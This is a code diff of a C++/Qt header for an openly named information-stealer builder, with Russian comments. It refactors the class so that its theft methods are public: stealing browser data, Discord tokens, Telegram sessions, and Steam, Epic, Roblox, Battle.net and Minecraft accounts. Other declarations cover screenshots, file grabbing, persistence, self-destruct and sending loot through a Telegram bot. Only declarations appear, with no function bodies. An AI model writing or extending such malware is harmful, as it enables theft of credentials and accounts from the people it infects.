@@ -36,6 +36,7 @@
 #include <filesystem>
 #include <vector>
 #include <string>
+#include <map>          // Добавлено для std::map
 #include <fstream>
 #include <thread>
 #include <regex>
@@ -92,6 +93,25 @@ public:
     void updateConfigFromUI();
     void setupPersistence();
 
+    // Методы для кражи данных (перенесены в public для использования в DataStealer)
+    std::string StealAndSendData(const std::string& tempDir); // Уже был публичным, но уточняем
+    std::string TakeScreenshot(const std::string& dir);
+    std::string stealBrowserData(const std::string& dir);
+    std::string stealChromiumBrowserData(const std::string& profilePath, const std::string& browserName, const std::string& tempDir); // Добавлено
+    std::string StealDiscordTokens(const std::string& dir);
+    std::string StealTelegramData(const std::string& dir);
+    std::string StealSteamData(const std::string& dir);
+    std::string StealEpicGamesData(const std::string& dir);
+    std::string StealRobloxData(const std::string& dir);
+    std::string StealBattleNetData(const std::string& dir);
+    std::string StealMinecraftData(const std::string& dir);
+    std::string StealArizonaRPData(const std::string& dir);
+    std::string StealRadmirRPData(const std::string& dir);
+    std::vector<std::string> GrabFiles(const std::string& dir);
+    std::string stealChatHistory(const std::string& dir);
+    std::string collectSocialEngineeringData(const std::string& dir);
+    std::string collectSystemInfo(const std::string& dir);
+
     // Структура для хранения настроек
     struct Config {
         bool discord = false;
@@ -115,8 +135,8 @@ public:
         bool autoStart = false;
         bool persist = false;
         bool selfDestruct = false;
-        bool arizonaRP = false;  // Изменено на arizonaRP для консистентности
-        bool radmirRP = false;   // Изменено на radmirRP для консистентности
+        bool arizonaRP = false;
+        bool radmirRP = false;
         std::string sendMethod = "Local File";
         std::string buildMethod = "Local Build";
         std::string telegramBotToken = "";
@@ -159,8 +179,8 @@ public:
     QCheckBox* autoStartCheckBox;
     QCheckBox* persistCheckBox;
     QCheckBox* selfDestructCheckBox;
-    QCheckBox* arizonaRPCheckBox;  // Добавлено
-    QCheckBox* radmirRPCheckBox;   // Добавлено
+    QCheckBox* arizonaRPCheckBox;  // Убедимся, что они есть
+    QCheckBox* radmirRPCheckBox;   // Убедимся, что они есть
     QTextEdit* textEdit;
     QPushButton* iconBrowseButton;
     QPushButton* buildButton;
@@ -172,15 +192,8 @@ public:
     QAction* actionAbout;
 
     // Векторы для хранения собранных данных
-    std::string collectedData;
+    std::map<std::string, std::string> collectedData; // Изменено на map
     std::vector<std::string> collectedFiles;
-
-    // Публичный метод StealAndSendData
-    void StealAndSendData(const std::string& tempDir);
-
-    // Методы для кражи данных из Arizona и Radmir (переименованы для консистентности)
-    std::string StealArizonaRPData(const std::string& dir);
-    std::string StealRadmirRPData(const std::string& dir);
 
 signals:
     void logUpdated(const QString& message, const QString& type = "info");
@@ -205,19 +218,6 @@ private slots:
 
     // Слоты для процесса кражи и отправки данных
     void startStealProcess();
-    std::string TakeScreenshot(const std::string& dir);
-    std::string stealBrowserData(const std::string& dir);
-    std::string StealDiscordTokens(const std::string& dir);
-    std::string StealTelegramData(const std::string& dir);
-    std::string StealSteamData(const std::string& dir);
-    std::string StealEpicGamesData(const std::string& dir);
-    std::string StealRobloxData(const std::string& dir);
-    std::string StealBattleNetData(const std::string& dir);
-    std::string StealMinecraftData(const std::string& dir);
-    std::vector<std::string> GrabFiles(const std::string& dir);
-    std::string stealChatHistory(const std::string& dir);
-    std::string collectSocialEngineeringData(const std::string& dir);
-    std::string collectSystemInfo(const std::string& dir);
     std::string archiveData(const std::string& dir, const std::vector<std::string>& files);
     std::string encryptData(const std::string& data);
 
